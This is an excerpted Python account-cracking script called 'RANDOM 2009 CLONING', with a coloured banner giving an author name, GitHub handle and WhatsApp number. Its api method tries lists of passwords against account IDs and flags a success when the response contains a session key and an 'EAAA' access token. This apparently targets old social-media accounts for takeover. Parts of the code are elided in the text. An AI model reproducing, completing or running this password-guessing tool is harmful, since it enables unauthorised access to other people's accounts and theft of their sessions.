...
---------_------±-------------±--------±  \033[1;32m
\033[93;32m╭──────────•◈•───────────────────╮
\033[93;32m[-] TOOLS     RANDOM 2009 CLONING
\033[93;32m[-] VERSION    2.0.0 (V2)
\033[93;32m[-] AUTHOR    Riyad
\033[93;32m[-] GITHUB   Riyad-405
\033[93;32m[-] WhatsApp  01729346558
\033[93;32m╰──────────•◈•───────────────────╯  
\033[93;32mWELCOME TO MY RANDOM 2009 TOOL 
...
class Main:
	def __init__(self):
		...
		if syed in ["", " "]:
			...
			os.system("xdg-open https://youtube.com/@user-fm9gl3vw1f")
			print("")
			time.sleep(2.0)
			print("\033[1;33m   Enter Your Name")
			print("")
			input("\n\033[1;32m  Type Your Riyad Name ==> \033[1;36m")
			time.sleep(2.1)
			print("")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[92;1m[Riyad] : %s/%s -> \033[0;92m [ OK:%s ]- \033[0;91m[CP:%s ]"%(B,self.loop, len(self.id), len(self.cp), len(self.ok))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[1;32m   [Riyad_OK] %s | %s\033[1;32m         "%(uid, pw))
